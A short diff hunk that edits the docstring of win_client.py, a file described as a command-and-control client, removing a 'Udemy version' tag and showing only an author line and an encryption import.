@@ -1,5 +1,5 @@
 
-""" win_client.py - Command and Control (c2) client code (Udemy version)
+""" win_client.py - Command and Control (c2) client code
     Author:  Karthik Mudgal """
 
 from encryption import cipher
